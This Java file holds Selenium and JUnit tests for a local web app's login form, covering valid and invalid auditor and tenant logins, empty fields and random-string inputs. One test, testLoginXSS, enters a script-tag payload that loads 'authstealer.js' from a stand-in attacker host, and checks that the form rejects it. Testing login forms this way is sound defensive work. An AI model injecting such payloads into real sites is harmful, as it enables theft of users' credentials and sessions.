import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.edge.EdgeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class TestLogin {

    public static WebDriver driver;
    public static WebDriverWait wait;
    public static WebElement loginButton;
    public static WebElement email;
    public static WebElement password;
    public static WebElement loginAsButton;
    public static ChromeOptions chromeOptions;

    protected String getSaltString() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 10) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }

    @Before
    public void setup() throws InterruptedException {
        // Optional. If not specified, WebDriver searches the PATH for chromedriver.
        System.setProperty("webdriver.chrome.driver", "C:\\chromedriver.exe");
        chromeOptions = new ChromeOptions();

        Map<String, Object> deviceMetrics = new HashMap<>();
        deviceMetrics.put("width", 550);
        deviceMetrics.put("height", 940);
        deviceMetrics.put("pixelRatio", 2.0);
        Map<String, Object> mobileEmulation = new HashMap<>();
        mobileEmulation.put("deviceMetrics", deviceMetrics);
//        mobileEmulation.put("deviceName", "iPhone 6");
        chromeOptions.setExperimentalOption("mobileEmulation", mobileEmulation);
        driver = new ChromeDriver(chromeOptions);
        int width = 565;
        int height = 1075;
        driver.manage().window().setSize(new Dimension(width, height));
//        driver.manage().window().maximize();
        driver.get("http://localhost:3000/");
        wait = new WebDriverWait(driver, 7);


        Thread.sleep(2500);
        email = driver.findElement(By.name("email"));
        password = driver.findElement(By.name("password"));
        loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/div/form/div/div[1]/div/label[1]/span[2]")));
        loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/div/form/div/div[5]/div/div/div/button/span")));
    }

    @Test
    public void testLoginAsAuditor() throws InterruptedException {

        email.sendKeys("sgh@auditor.com");
        password.sendKeys("sgh2021");

        Thread.sleep(1000);

        loginButton.click();

        Thread.sleep(2000);
    }

    @Test
    public void testLoginAsAuditorWrongPassword() throws InterruptedException {

        email.sendKeys("cgh@auditor.com");
        password.sendKeys("wrongpassword");

        loginButton.click();

        try {

            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "Auditor does not exist"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }


        Thread.sleep(500);


//        WebElement errorMessage = driver.findElement(By.xpath("///*[@id=\"root\"]/form/div[2]/div[4]/ul/div/div/div[1]"));
        ////*[@id="root"]/form/div[2]/div[4]/ul/div/div/div[1]
        ///html/body/div/form/div[2]/div[4]/ul/div/div/div[1]

//        System.out.println(errorMessage.toString());


//        assert(errorMessage.getText() == "Wrong credentials");
    }

    @Test
    public void testLoginAsAuditorWrongEmail() throws InterruptedException {

        email.sendKeys("cgh@audi123tor.com");
        password.sendKeys("cgh2021");
        loginButton.click();

        try {

            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "exist"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }
        Thread.sleep(500);
    }

    @Test
    public void testLoginAsAuditorNeverFillPassword() throws InterruptedException {

        email.sendKeys("currentixer@gmail.com");

        loginButton.click();

        try {

            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "empty"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }

        Thread.sleep(500);
    }

    @Test
    public void testLoginAsTenant() throws InterruptedException {
        loginAsButton.click();
        email.sendKeys("cghNoelGifts@tenant.com");
        password.sendKeys("noelgifts2021");
        loginButton.click();

        try {

            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "found"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }
        Thread.sleep(500);
    }

    @Test
    public void testLoginFuzzerEmail() throws InterruptedException {
        loginAsButton.click();
        email.sendKeys(getSaltString() + "@tenant.com");
        password.sendKeys("noelgifts2021");
        loginButton.click();

        try {

            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "found"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }

        Thread.sleep(500);
    }

    @Test
    public void testLoginFuzzerEmailAndPassword() throws InterruptedException {
        loginAsButton.click();
        email.sendKeys(getSaltString() + "@tenant.com");
        password.sendKeys(getSaltString());
        loginButton.click();
        try {
            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "found"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }
        Thread.sleep(500);
    }

    @Test
    public void testLoginXSS() throws InterruptedException {
        loginAsButton.click();
        email.sendKeys("<script src=”http://hackersite.com/authstealer.js”> </script>");
        password.sendKeys(getSaltString());
        loginButton.click();

        try {
            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
                    "Tenant not found"));
            assert (exist);
        } catch (TimeoutException e) {
            assert (false);
        }
        Thread.sleep(500);

    }

    @After
    public void quit() throws InterruptedException {
        driver.quit();
    }
}


